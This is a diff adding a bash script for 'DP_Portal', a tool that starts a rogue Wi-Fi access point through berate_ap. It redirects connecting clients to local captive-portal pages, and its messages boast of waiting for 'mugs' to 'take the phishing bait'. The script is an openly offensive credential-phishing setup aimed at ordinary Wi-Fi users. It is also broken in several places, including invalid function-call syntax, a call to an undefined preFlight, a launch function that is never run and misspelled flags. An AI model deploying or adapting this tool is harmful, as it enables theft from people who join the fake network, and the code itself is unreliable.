@@ -1,0 +1,283 @@
+#!/bin/bash
+
+#######Bootstrap Script#########
+
+#Written by Double_D  - Sometime in March 2024
+
+###Lets gather some vars
+
+#Custom hosts file
+dppHosts="/etc/dpportal/config/dpphosts"
+
+##Colours and formatting for stdOut and stdErr
+warn="\e[1;31m"      # warning (red)
+info="\e[1;34m"      # info (blue)
+q="\e[1;32m"         # questions (green)
+
+
+###Some more colour and formatting vars, some may become redundant as I continue to dev and tidy up my project
+_bold=$(tput bold)
+_underline=$(tput sgr 0 1)
+_reset=$(tput sgr0)
+_purple=$(tput setaf 171)
+_red=$(tput setaf 1)
+_green=$(tput setaf 76)
+_tan=$(tput setaf 3)
+_blue=$(tput setaf 38)
+
+
+#Check if running as root first
+scriptUser=$(id -u)
+if [[ $scriptUser -ne 0 ]]; then
+	echo -e "$warn\nThis script needs to be run with sudo privileges. Exiting, no changes have been made...\n"
+	_die "Insufficiently privileged! Bye."
+fi
+
+#Function that prints arrows and formats stdout stuff then arguement (just bells and whistles)
+function _arrow()
+{
+    printf "➜ $@\n"
+}
+
+function _success()
+{
+    printf "${_green}✔ %s${_reset}\n" "$@"
+}
+
+function _error() {
+    printf "${_red}✖ %s${_reset}\n" "$@"
+}
+
+function _die()
+{
+    _error "$@"
+    exit 1
+}
+
+function _safeExit()
+{
+    exit 0
+}
+
+trap ctrl_c INT TERM
+
+function ctrl_c()
+{
+	echo -n -e "$infoExiting DP_Portal."
+	for i in $(seq 1 5)
+    do
+		sleep 1
+        if [[ $i -eq 1 ]]; then
+        	kill $thisBeratePID
+		fi
+        
+        if [[ $i -eq 2 ]]; then
+        	a2dissite dpportal.conf
+		fi
+
+        if [[ $i -eq 3 ]]; then
+        	a2dissite dppoptions.conf
+		fi
+
+        if [[ $i -eq 4 ]]; then
+        	a2dissite dppdisplay.conf
+		fi
+        
+        if [[ $i -eq 5 ]]; then
+        	echo -e "$infoThank you for using the DP-Portal!"
+           	echo -n "."
+            sleep 2
+            echo -n "."
+            sleep 1
+            echo -n "."
+		fi
+		echo -n "."
+	done
+	clear
+	echo "$info\n\nIt's been emotional, see you later."
+    exit 0
+
+}
+
+function _printPoweredBy()
+{
+    cat <<"EOF"
+
+
+
+  _____  _____        _____   ____  _____ _______       _      
+ |  __ \|  __ \      |  __ \ / __ \|  __ \__   __|/\   | |     
+ | |  | | |__) |_____| |__) | |  | | |__) | | |  /  \  | |     
+ | |  | |  ___/______|  ___/| |  | |  _  /  | | / /\ \ | |     
+ | |__| | |          | |    | |__| | | \ \  | |/ ____ \| |____ 
+ |_____/|_|          |_|     \____/|_|  \_\ |_/_/    \_\______|
+                                                               
+
+  written by: Double_D
+
+
+
+
+################################################################
+EOF
+sleep 1
+}
+
+
+function processArgs()
+{
+	#Set hard arguements
+    allOptsArgs="$dppHosts -n --redirect-to-localhost"
+    useWifiT=0
+    # Parse soft arguments
+    for arg in "$@"
+    do
+        case $arg in
+            -s=*|--ssid=*)
+                ssidName="${arg#*=}"
+            ;;
+            -i=*|--interface=*)
+                wifiInt="${arg#*=}"
+            ;;
+            -c=*|--channel=*)
+                wifiChan="${arg#*=}"
+                allOptsArgs+=" -c $wifiChan"
+            ;;
+            -f=*|--frequency=*)
+                wifiFreq="${arg#*=}"
+                allOptsArgs+=" --freq-band $wifiFreq"
+			;;
+			-b=*|--bssid=*)
+				wifiBSSID="${arg#*=}"
+                allOptsArgs+=" --mac $wifiBSSID"
+            ;;
+            -d=*|--driver=*)
+            	nicDriver="${arg#*=}"
+                allOptsArgs+=" --driver $nicDriver"
+            ;;
+            -s|--show-mugs)
+                showClients=1
+			;;
+			--ieee80211n)
+				useWifiT=1
+			;;
+			--ieee802111ac)
+            	if [[ $useWifiT -eq 1 ]]; then
+                	useWifiT=3
+				else
+                	useWifiT=2
+                fi
+            ;;
+            -h|--help)
+                printUsage()
+            ;;
+            *)
+                printUsage()
+            ;;
+        esac
+    done
+	
+	if [[ -z "$ssidName" ]]; then
+		echo -e "$warn\n\nYou must specify an SSID..! Come on, think!\n"
+		exit 1
+	fi
+	
+	if [[ -z "$wifiInt" ]]; then
+		echo -e "$warn\n\nHow could this work without you specifying a Wi-Fi interface!? Daft melt! \n"
+		exit 1
+	fi
+
+    if [[ $useWifiT -eq 3 ]] then
+    	echo -e "$warn\nYou can't use 802.11n and 802.11ac at the same time! Daft bastard!\n\n"
+        _safeExit
+    elif [[ $useWifiT -eq 2 ]]; then
+    	allOptsArgs+=" --iee80211ac"
+    elif [[ $useWifiT -eq 1 ]]; then
+    	allOptsArgs+=" --iee80211n"
+    fi
+
+preFlight
+
+
+}
+
+
+function printUsage()
+{
+	#clear
+	_printPoweredBy
+	echo -e "$info\nTo use this tool, run:\n\n\n\ndp_portal [OPTIONS] <Desired SSID> <Wi-Fi Interface>\n\n#######################################"
+	_safeExit
+}
+
+function postFlight()
+{
+
+	clear
+    _printPoweredBy
+    
+    #If user wants it, show connected clients as and when they connect
+    if [[ $showClients -eq 1 ]]; then
+    	#Not sure if this is one one-off list output or a live tail - may need to modify to update list every couple of seconds or something
+    	Eterm -g 80x8-0+225 --pointer-color "dark orange" -f DarkOrchid4 -b LightYellow1 -r --font-fx none --buttonbar 0  --scrollbar 0 -q -T "List of mugs as they connect to our roastathon..." -e berate_ap --list-clients $wifiInt 2> /dev/null &
+	fi
+	
+    #show running message
+	_success "DP_Portal is running, waiting for some absolute mugs to connect and take the phishing bait...!"
+
+}
+
+
+function _pruneLogs()
+{
+
+#Delete logs older than 7 days
+find /etc/dpportal/logs/ -mtime +7 -type f -exec rm {} \;
+
+}
+
+
+function _preFlight()
+{
+
+_pruneLogs
+
+#set log files
+dStamp=$(date '+%Y%m%d%H%M%S')
+
+dppErrLogName="DPP_Error_$dStamp.log"
+dppOutLogName="DPP_Output_$dStamp.log"
+
+touch /etc/dpportal/logs/$dppErrLogName
+touch /etc/dpportal/logs/$dppOutLogName
+
+dppOutLog="/etc/dpportal/logs/$dppOutLogName"
+dppErrLog="/etc/dpportal/logs/$dppErrLogName"
+
+}
+
+
+function startBerate()
+{
+
+#Run preflight function
+_preFlight
+
+#Starts berate_ap process with user defined arguements and options outputing stdout and stderr to separate files
+berate_ap $allOptsArgs > $dppOutLog 2> $dppErrLog &
+
+thisBeratePID=$(echo $!)
+postFlight
+
+}
+
+function welcomeAll()
+{
+
+clear
+_printPoweredBy
+processArgs
+
+}
+
+welcomeAll
